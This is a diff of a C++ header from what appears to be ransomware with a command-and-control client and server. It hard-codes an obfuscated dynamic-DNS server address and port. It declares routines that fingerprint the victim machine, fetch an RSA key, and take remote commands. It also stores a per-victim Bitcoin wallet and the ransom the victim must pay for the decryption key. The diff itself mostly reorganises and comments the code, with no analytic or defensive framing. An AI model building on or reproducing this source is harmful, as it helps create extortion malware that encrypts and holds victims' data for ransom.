@@ -1,5 +1,4 @@
-#ifndef _CLIENT_H_
-#define _CLIENT_H_
+#pragma once
 
 #include "procmgr.h"
 #include "framework.h"
@@ -17,72 +16,62 @@
 #include <openssl/bio.h>
 #include <filesystem>
 
-#pragma comment( lib, "ws2_32.lib" )
+#pragma comment(lib, "ws2_32.lib")
 
 const unsigned int UDP_PORT = 5454;
 const std::string  DNS_NAME = std::string(HIDE("logicgate-test.ddns.net"));
 
 class Client {
 public:
-    inline const SOCKET      GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPSocket : this->m_UDPSocket; }
-    inline const RSAKeys     GetSecrets() const { return this->m_Secrets; }
-    inline const Server      GetServerDetails(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPServerDetails : this->m_UDPServerDetails; }
-    inline const sockaddr_in GetAddressInfo() const { return this->m_AddressInfo; }
-    inline const std::string GetDesktopName() const { return this->m_ComputerName; }
-    inline void              SetDesktopName(auto name) { this->m_ComputerName = name; }
-    inline const std::string GetMachineGUID() const { return this->m_MachineGUID; }
-    inline void              SetMachineGUID(auto name) { this->m_MachineGUID = name; }
-    inline void              SetEncryptionKeys(RSAKeys& keys) { this->m_Secrets = keys; }
-
+    const std::string  GetDesktopName() const { return this->m_ComputerName; }
+    void               SetDesktopName(auto name) { this->m_ComputerName = name; }
+    const std::string  GetMachineGUID() const { return this->m_MachineGUID; }
+    void               SetMachineGUID(auto name) { this->m_MachineGUID = name; }
+    void               SetEncryptionKeys(RSAKeys& keys) { this->m_Secrets = keys; }
 private:
-    std::string    m_ComputerName = "unknown";
-    std::string    m_MachineGUID = "unknown";
-    Server         m_TCPServerDetails = {};
-    Server         m_UDPServerDetails = {};
-    SOCKET         m_UDPSocket        = INVALID_SOCKET;
-    SOCKET         m_TCPSocket        = INVALID_SOCKET;
-    sockaddr_in    m_AddressInfo      = {};
-    RSAKeys        m_Secrets          = {};
+    std::string        m_ComputerName = "unknown";  // remote host computer name. e.g DESKTOP-AJDU31S
+    std::string        m_MachineGUID  = "unknown";  // remote host windows machine guid. e.g 831js9fka29-ajs93j19sa82....
+    RSAKeys            m_Secrets      = {};         // Client RSA keys saved as strings
+    SOCKET             m_UDPSocket    = INVALID_SOCKET;
+    SOCKET             m_TCPSocket    = INVALID_SOCKET;
 
-#ifdef CLIENT_RELEASE // Client only methods
+#ifdef CLIENT_RELEASE                               // Client only methods
 public:
     Client();
     ~Client();
-
-    ProcessManager ProcManager;
-
-    BOOL           Connect(); // Connect to the tcp server
-    BOOL           Disconnect(); // Disconnect from the tcp server
-    BYTESTRING     MakeTCPRequest(ClientRequest req, BOOL encrypted = FALSE); // send a message, receive the response
-    BOOL           SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
-    BOOL           SendEncryptedMessageToServer(Server dest, ClientMessage message);
-    BOOL           ListenForServerCommands(); // listen for commands from the server and perform them
+    BOOL               Connect();                   // Connect to the tcp server
+    BOOL               Disconnect();                // Disconnect from the tcp server
+    BYTESTRING         MakeTCPRequest(ClientRequest req, BOOL encrypted = FALSE); // send a message, receive the response
+    BOOL               SendMessageToServer(Server dest, ClientMessage message, sockaddr_in udpAddr = NetCommon::_default);
+    BOOL               SendEncryptedMessageToServer(Server dest, ClientMessage message);
+    BOOL               ListenForServerCommands();   // listen for commands from the server and perform them
+    BOOL               SendComputerNameToServer();
     template <typename _Ty>
-    BOOL           ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
-    BOOL           SendComputerNameToServer();
-
+    BOOL               ReceiveMessageFromServer(Server who, _Ty& out, sockaddr_in& outAddr);
 private:
-    void           ReceiveCommandsFromServer(); // thread to continously receive 'ServerCommand' messages from the server
-    void           SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
-    void           SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
-    BOOL           GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
-    BOOL           SendMachineGUIDToServer();
+    void               ReceiveCommandsFromServer(); // thread to continuously receive 'ServerCommand' messages from the server
+    void               SetRemoteComputerName();     // set this->m_ComputerName to the current PCs desktop name
+    void               SetRemoteMachineGUID();      // set this->m_MachineGUID to the current PCs windows machine guid
+    BOOL               GetPublicRSAKeyFromServer(); // get public rsa key from server, save it to this->m_Secrets as a string
+    BOOL               SendMachineGUIDToServer();
 
-#elif defined(SERVER_RELEASE) // Server only client implementation
+    ProcessManager     Remote;                      // remote host process manager
+    Server             m_TCPServerDetails = {};     // details describing the tcp server
+    Server             m_UDPServerDetails = {};
+
+#elif defined(SERVER_RELEASE)                       // Server only client implementation
 public:
     Client() = default;
-    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr) 
-        : m_AddressInfo(addr), m_TCPSocket(tcp), m_UDPSocket(udp) 
-    {
-        std::random_device gen;
-        std::mt19937 rng(gen());
-        std::uniform_int_distribution<std::mt19937::result_type> dist(1, 10400);
-        this->ClientUID = dist(rng);
-    }
+    Client(SOCKET tcp, SOCKET udp, sockaddr_in addr);
 
-    long           ClientUID = -1;
-    std::string    UniqueBTCWalletAddress; // Wallet address to send ransom money to
-    long           RansomAmountUSD;
+    const sockaddr_in  GetAddressInfo()            const { return this->AddressInfo; }
+    const RSAKeys&     GetSecrets()                const { return this->m_Secrets; }
+    const SOCKET       GetSocket(SocketTypes type) const { return ( type == TCP ) ? this->m_TCPSocket : this->m_UDPSocket; }
+
+    std::string        UniqueBTCWalletAddress;      // Wallet address to send ransom money to
+    long               RansomAmountUSD  = 0;        // amount the client must pay for rsa private key in usd
+    long               ClientUID        = -1;       // unique client id for the server
+    sockaddr_in        AddressInfo      = {};       // Address info for the eserver to send messages over udp 
 
     /*
         Implementation for event handling- to wait
@@ -94,11 +83,8 @@ public:
         that sets expecting response to true and consistantly checks recent client response
         against last client response, waiting for a new client response.
     */
-    BOOL           ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
-    ClientResponse RecentClientResponse;
-    ClientResponse LastClientResponse;
+    BOOL               ExpectingResponse; // Expecting a ClientResponse from a client not a clientREQUEST
+    ClientResponse     RecentClientResponse;
+    ClientResponse     LastClientResponse;
 #endif
 };
-
-
-#endif
